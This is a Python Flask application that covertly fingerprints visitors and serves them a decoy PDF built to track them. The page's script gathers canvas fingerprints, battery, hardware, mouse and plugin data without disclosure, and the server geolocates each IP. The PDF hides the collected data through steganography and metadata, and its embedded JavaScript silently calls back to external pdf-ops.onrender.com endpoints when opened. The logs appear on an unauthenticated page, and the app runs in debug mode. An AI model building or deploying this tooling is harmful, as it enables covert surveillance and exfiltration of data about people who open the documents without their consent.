from flask import Flask, request, render_template_string, send_file
import logging
import json
import os
import requests
import base64
import uuid
from faker import Faker
from io import BytesIO
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Image
from reportlab.lib.styles import getSampleStyleSheet
from cryptography.fernet import Fernet
from stegano import lsb
from PIL import Image as PILImage
import PyPDF2

app = Flask(__name__)

# Configure logging to a file
logging.basicConfig(
    level=logging.INFO,
    filename='user_logs.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Faker for generating fake PDF content
fake = Faker()

# Encryption key (in production, store securely, e.g., environment variable)
ENCRYPTION_KEY = Fernet.generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

# Store tokens for verification
logged_tokens = {}

def get_hidden_message(data):
    """Return the hidden message wrapped with markers."""
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    return "<<BASE64 START>>" + encoded + "<<BASE64 END>>"

def get_ip_geolocation(ip):
    """Fetch geolocation data from ipinfo.io."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        if response.status_code == 200:
            data = response.json()
            loc = data.get("loc", "").split(",")
            if loc and len(loc) == 2:
                return float(loc[0]), float(loc[1]), data
            else:
                return None, None, data
    except Exception as e:
        logging.error(f"IP Geolocation error: {e}")
    return None, None, {}

def collect_data(req):
    """Collect client-side and server-side data."""
    ip_header = req.headers.get('X-Forwarded-For', req.remote_addr)
    ip = ip_header.split(",")[0].strip() if ip_header else req.remote_addr
    user_agent = req.headers.get('User-Agent', 'unknown')
    cookies = req.cookies
    tls_metadata = req.environ.get('wsgi.url_scheme')

    client_data = {
        'screenWidth': req.form.get('screenWidth'),
        'screenHeight': req.form.get('screenHeight'),
        'colorDepth': req.form.get('colorDepth'),
        'pixelDepth': req.form.get('pixelDepth'),
        'language': req.form.get('language'),
        'platform': req.form.get('platform'),
        'connection': req.form.get('connection'),
        'pageLoadTime': req.form.get('pageLoadTime'),
        'clickTime': req.form.get('clickTime'),
        'dwellTime': req.form.get('dwellTime'),
        'lastMouseX': req.form.get('lastMouseX'),
        'lastMouseY': req.form.get('lastMouseY'),
        'referrer': req.form.get('referrer'),
        'canvasFingerprint': req.form.get('canvasFingerprint'),
        'hardwareConcurrency': req.form.get('hardwareConcurrency'),
        'deviceMemory': req.form.get('deviceMemory'),
        'timezoneOffset': req.form.get('timezoneOffset'),
        'touchSupport': req.form.get('touchSupport'),
        'batteryLevel': req.form.get('batteryLevel'),
        'charging': req.form.get('charging'),
        'downlink': req.form.get('downlink'),
        'plugins': req.form.get('plugins')
    }

    lat, lon, geo_data = get_ip_geolocation(ip)
    client_data['latitude'] = lat if lat is not None else ""
    client_data['longitude'] = lon if lon is not None else ""
    client_data['ip_geolocation'] = geo_data

    log_message = {
        'ip': ip,
        'user_agent': user_agent,
        'action': 'Downloaded PDF',
        'client_data': client_data,
        'request_headers': dict(req.headers),
        'cookies': cookies,
        'tls_metadata': tls_metadata
    }
    return log_message

def embed_data_in_image(data):
    """Embed encrypted data in an image using steganography."""
    encrypted_data = CIPHER.encrypt(json.dumps(data).encode())
    # Create a larger base image (500x500) for more capacity.
    base_img = PILImage.new('RGB', (500, 500), color='white')
    temp_path = 'temp_base.png'
    base_img.save(temp_path)
    stego_img = lsb.hide(temp_path, encrypted_data)
    os.remove(temp_path)
    return stego_img

def simulate_multi_stage_payload(data):
    """Simulate multi-stage payload delivery (for demonstration only)."""
    logging.info("Simulating multi-stage payload delivery with data: " + json.dumps(data))
    stage_payload = {"stage": "initial", "info": "Initial payload delivered"}
    # Simulate a secondary stage
    stage_payload["stage"] = "secondary"
    stage_payload["info"] = "Additional stage executed"
    logging.info("Simulated multi-stage payload: " + json.dumps(stage_payload))
    return stage_payload

def simulate_dll_injection():
    """Simulate a DLL injection (for demonstration only)."""
    logging.info("Simulated DLL injection executed (defensive demonstration only)")
    return "DLL injection simulated"

def generate_pdf(logged_data):
    """Generate a PDF with fake content and embedded steganographic data.
    Afterwards, add custom metadata and embedded JavaScript callbacks via PyPDF2."""
    # Build PDF using Platypus
    buffer = BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter)
    styles = getSampleStyleSheet()
    story = []

    # Fake content
    story.append(Paragraph("Fake PDF Document", styles['Title']))
    story.append(Paragraph(f"Name: {fake.name()}", styles['Normal']))
    address = fake.address().replace('\n', ', ')
    story.append(Paragraph(f"Address: {address}", styles['Normal']))
    story.append(Paragraph("Additional Info:", styles['Normal']))
    story.append(Paragraph(fake.text(max_nb_chars=200), styles['Normal']))

    # Embed data in an image using steganography
    stego_img = embed_data_in_image(logged_data)
    img_buffer = BytesIO()
    stego_img.save(img_buffer, format='PNG')
    img_buffer.seek(0)
    story.append(Image(img_buffer, width=100, height=100))

    # Verification link with unique token
    token = str(uuid.uuid4())
    verification_link = f"https://pdf-ops.onrender.com/verify?token={token}"
    story.append(Paragraph(f"Please <a href='{verification_link}'>click here</a> to thank our services.", styles['Normal']))

    doc.build(story)
    buffer.seek(0)
    
    # Now add extra metadata and JavaScript via PyPDF2.
    hidden_message = get_hidden_message(logged_data)
    reversed_token = token[::-1]
    
    pdf_reader = PyPDF2.PdfReader(buffer)
    pdf_writer = PyPDF2.PdfWriter()
    for page in pdf_reader.pages:
        pdf_writer.add_page(page)
    # Add custom metadata containing the hidden message.
    pdf_writer.add_metadata({'/HiddenData': hidden_message})
    
    # Embed JavaScript callbacks without alerting the user.
    js_code = f"""
    // Primary callback: send hidden message to the server.
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req1 = new XMLHttpRequest();
            req1.open("GET", "https://pdf-ops.onrender.com/pdf_callback?data=" + encodeURIComponent("{hidden_message}"), true);
            req1.send();
        }} catch(e) {{}}
    }}
    // Secondary callback: send the reversed token (which is reversed back) to a second endpoint.
    var reversedToken = "{reversed_token}";
    var token = reversedToken.split("").reverse().join("");
    if (typeof XMLHttpRequest !== 'undefined') {{
        try {{
            var req2 = new XMLHttpRequest();
            req2.open("GET", "https://pdf-ops.onrender.com/pdf_callback_stage2?token=" + encodeURIComponent(token), true);
            req2.send();
        }} catch(e) {{}}
    }}
    """
    pdf_writer.add_js(js_code)
    
    new_buffer = BytesIO()
    pdf_writer.write(new_buffer)
    new_buffer.seek(0)
    return new_buffer, token

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Download PDF</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 100px;
            background-color: #f2f2f2;
        }
        h1 { color: #333; }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover { background-color: #45a049; }
    </style>
</head>
<body>
    <h1>Click to Download PDF and Log Your Data</h1>
    <form id="downloadForm" action="/download" method="post">
        <button type="submit">Download PDF</button>
        <input type="hidden" name="screenWidth" id="screenWidth">
        <input type="hidden" name="screenHeight" id="screenHeight">
        <input type="hidden" name="colorDepth" id="colorDepth">
        <input type="hidden" name="pixelDepth" id="pixelDepth">
        <input type="hidden" name="language" id="language">
        <input type="hidden" name="platform" id="platform">
        <input type="hidden" name="connection" id="connection">
        <input type="hidden" name="pageLoadTime" id="pageLoadTime">
        <input type="hidden" name="clickTime" id="clickTime">
        <input type="hidden" name="dwellTime" id="dwellTime">
        <input type="hidden" name="lastMouseX" id="lastMouseX">
        <input type="hidden" name="lastMouseY" id="lastMouseY">
        <input type="hidden" name="referrer" id="referrer">
        <input type="hidden" name="canvasFingerprint" id="canvasFingerprint">
        <input type="hidden" name="hardwareConcurrency" id="hardwareConcurrency">
        <input type="hidden" name="deviceMemory" id="deviceMemory">
        <input type="hidden" name="timezoneOffset" id="timezoneOffset">
        <input type="hidden" name="touchSupport" id="touchSupport">
        <input type="hidden" name="batteryLevel" id="batteryLevel">
        <input type="hidden" name="charging" id="charging">
        <input type="hidden" name="downlink" id="downlink">
        <input type="hidden" name="plugins" id="plugins">
    </form>
    <br>
    <a href="/logs">View Logged Data</a>
    <script>
        var pageLoadTime = Date.now();
        document.getElementById('pageLoadTime').value = pageLoadTime;
        var lastMouseX = 0, lastMouseY = 0;
        document.addEventListener('mousemove', function(e) {
            lastMouseX = e.clientX;
            lastMouseY = e.clientY;
        });
        function gatherExtraData(callback) {
            var canvas = document.createElement("canvas");
            var ctx = canvas.getContext("2d");
            ctx.textBaseline = "top";
            ctx.font = "14px Arial";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Hello, world!", 2, 15);
            document.getElementById('canvasFingerprint').value = canvas.toDataURL();
            document.getElementById('hardwareConcurrency').value = navigator.hardwareConcurrency || '';
            document.getElementById('deviceMemory').value = navigator.deviceMemory || '';
            document.getElementById('timezoneOffset').value = new Date().getTimezoneOffset();
            document.getElementById('touchSupport').value = ('ontouchstart' in window) ? true : false;
            if (navigator.plugins) {
                var plugins = Array.from(navigator.plugins).map(function(p) { return p.name; });
                document.getElementById('plugins').value = plugins.join(', ');
            } else {
                document.getElementById('plugins').value = '';
            }
            if (navigator.connection && navigator.connection.downlink) {
                document.getElementById('downlink').value = navigator.connection.downlink;
            } else {
                document.getElementById('downlink').value = '';
            }
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    document.getElementById('batteryLevel').value = battery.level;
                    document.getElementById('charging').value = battery.charging;
                    callback();
                }).catch(function(error) {
                    document.getElementById('batteryLevel').value = '';
                    document.getElementById('charging').value = '';
                    callback();
                });
            } else {
                document.getElementById('batteryLevel').value = '';
                document.getElementById('charging').value = '';
                callback();
            }
        }
        document.getElementById('downloadForm').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('screenWidth').value = screen.width;
            document.getElementById('screenHeight').value = screen.height;
            document.getElementById('colorDepth').value = screen.colorDepth;
            document.getElementById('pixelDepth').value = screen.pixelDepth;
            document.getElementById('language').value = navigator.language;
            document.getElementById('platform').value = navigator.platform;
            if (navigator.connection && navigator.connection.effectiveType) {
                document.getElementById('connection').value = navigator.connection.effectiveType;
            } else {
                document.getElementById('connection').value = '';
            }
            document.getElementById('referrer').value = document.referrer;
            var clickTime = Date.now();
            document.getElementById('clickTime').value = clickTime;
            document.getElementById('dwellTime').value = clickTime - pageLoadTime;
            document.getElementById('lastMouseX').value = lastMouseX;
            document.getElementById('lastMouseY').value = lastMouseY;
            gatherExtraData(function() {
                e.target.submit();
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/download', methods=['POST'])
def download():
    logged_data = collect_data(request)
    logging.info(json.dumps(logged_data))
    
    multi_stage_result = simulate_multi_stage_payload(logged_data)
    dll_injection_result = simulate_dll_injection()
    logged_data["simulation"] = {
        "multi_stage": multi_stage_result,
        "dll_injection": dll_injection_result
    }

    pdf_buffer, token = generate_pdf(logged_data)
    logged_tokens[token] = logged_data

    return send_file(pdf_buffer, as_attachment=True, download_name='sample.pdf', mimetype='application/pdf')

@app.route('/verify', methods=['GET'])
def verify():
    token = request.args.get('token')
    if token in logged_tokens:
        logging.info(f"PDF opened for token: {token} - Data: {json.dumps(logged_tokens[token])}")
        del logged_tokens[token]
        return "Thank you!", 200
    return "Invalid token", 400

@app.route('/pdf_callback', methods=['GET'])
def pdf_callback():
    hidden_data = request.args.get('data', '')
    logging.info("Primary PDF callback triggered with data: " + hidden_data)
    return "Primary callback logged", 200

@app.route('/pdf_callback_stage2', methods=['GET'])
def pdf_callback_stage2():
    token = request.args.get('token', '')
    if token in logged_tokens:
        logging.info(f"Stage2 callback: Token {token} verified with data: {json.dumps(logged_tokens[token])}")
        return "Stage2 callback logged", 200
    return "Invalid token", 400

@app.route('/logs')
def display_logs():
    try:
        with open('user_logs.log', 'r') as f:
            logs = f.read()
    except Exception as e:
        logs = f"Error reading log file: {e}"
    
    logs_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>User Logs</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background-color: #f9f9f9; }
            h1 { color: #333; }
            pre { background: #eee; padding: 15px; border-radius: 5px; overflow: auto; }
        </style>
    </head>
    <body>
        <h1>User Logs</h1>
        <pre>{{ logs }}</pre>
    </body>
    </html>
    """
    return render_template_string(logs_html, logs=logs)

@app.route('/simulate')
def simulate():
    return "Simulation endpoint", 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host="0.0.0.0", port=port)
